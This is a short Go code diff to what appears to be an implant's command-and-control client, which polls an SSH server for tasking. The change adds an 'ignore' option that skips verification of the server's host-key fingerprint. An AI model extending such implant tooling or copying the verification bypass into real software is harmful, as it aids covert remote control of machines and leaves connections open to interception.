@@ -26,6 +26,9 @@ import (
 // may be set at compile-time.
 var ImplantID string
 
+// IgnoreFP is the flag to not check if the server fingerprint is expected.
+const IgnoreFP = "ignore"
+
 // DoClient makes connections to the SSH server at addr every bInt.  It checks
 // the fingerprint before auth.  It uses challenge-response auth to get tasking
 // and return results.
@@ -74,6 +77,13 @@ func DoClient(
 			remote net.Addr,
 			key ssh.PublicKey,
 		) error {
+			/* Only check the fingerprint if we're not meant to
+			ignore it */
+			if IgnoreFP == fingerprint {
+				return nil
+			}
+
+			/* Validate the fingerprint */
 			fp := ssh.FingerprintSHA256(key)
 			if 1 != subtle.ConstantTimeCompare(
 				[]byte(fp),
